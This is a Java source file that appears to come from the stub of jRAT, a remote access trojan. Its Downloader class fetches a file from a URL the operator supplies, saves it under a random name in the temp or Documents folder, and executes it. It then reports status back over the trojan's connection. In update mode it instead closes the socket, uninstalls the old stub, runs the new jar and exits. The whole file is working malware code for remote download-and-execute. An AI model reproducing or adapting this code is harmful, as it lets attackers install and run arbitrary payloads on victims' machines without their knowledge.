package io.jrat.stub;

import io.jrat.common.OperatingSystem;
import io.jrat.common.downloadable.Downloadable;
import io.jrat.stub.packets.incoming.Packet36Uninstall;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;


public class Downloader extends Thread {

	private String url;
	private boolean update;
	private Downloadable type;

	public Downloader(String url, boolean update, String type) {
		this.url = url;
		this.update = update;
		this.type = Downloadable.get(type);
	}

	public void run() {
		try {
			Connection.status(Constants.STATUS_DOWNLOADING_FILE);

			URLConnection con = new URL(url).openConnection();

			String fileName = (new Random().nextInt()) + type.getExtension();

			try {
				File file = null;
				if (update) {
					file = File.createTempFile(Configuration.name + (new Random()).nextInt(), ".jar");
				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					file = new File(System.getProperty("java.io.tmpdir"), fileName);
				} else {
					file = new File(System.getProperty("user.home") + "/Documents/" + fileName);
				}

				if (!file.getParentFile().exists()) {
					file.getParentFile().mkdirs();
				}

				InputStream in = con.getInputStream();
				FileOutputStream fout = new FileOutputStream(file);

				byte data[] = new byte[1024];
				int count;
				while ((count = in.read(data, 0, 1024)) != -1) {
					fout.write(data, 0, count);
				}

				in.close();
				fout.close();

				if (update) {
					try {
						Connection.socket.close();
					} catch (Exception ex) {
						ex.printStackTrace();
					}
					new Packet36Uninstall().read();
					type.execute(file);
					Configuration.running = false;
					System.exit(0);
				} else {
					type.execute(file);
					Connection.status(Constants.STATUS_EXECUTED_FILE);
				}
			} finally {

			}
		} catch (Exception ex) {
			Connection.status("Failed downloading: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
			ex.printStackTrace();
		}
	}

}
